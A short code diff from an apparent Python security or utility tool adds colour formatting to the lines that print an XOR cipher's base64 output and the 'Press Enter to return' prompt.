         b64_out = base64.b64encode(output.encode('utf-8')).decode('utf-8')
-        print(f"\n[+] XOR Output (Base64 string): {b64_out}")
+        print(f"{Colors.GREEN}\n[+] XOR Output (Base64 string): {b64_out}{Colors.ENDC}")
         log_scan("Crypto Engine", "XOR Cipher", b64_out)
         
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
